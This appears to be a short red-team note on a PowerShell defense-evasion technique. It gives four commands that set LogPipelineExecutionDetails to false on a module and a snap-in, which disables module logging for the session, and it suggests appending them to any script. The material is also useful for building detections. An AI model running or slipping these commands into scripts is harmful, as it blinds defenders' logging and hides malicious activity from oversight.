# Abusing log pipeline

Within PowerShell, each module or snap-in has a setting that anyone can use to modify its logging functionality. An 
attacker can change this value to `$false` in any PowerShell session to disable a module logging for that specific 
session. The Microsoft docs even note the ability to disable logging from a user session: 
_"To disable logging, use the same command sequence to set the property value to FALSE ($false)."_

At a high-level the log pipeline technique can be broken up into four steps:

1. Obtain the target module.
2. Set module execution details to `$false`.
3. Obtain the module snap-in.
4. Set snap-in execution details to `$false`.

## Code

```text
$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false
```

Append to any PowerShell script or run in a session to disable module logging of currently imported modules.
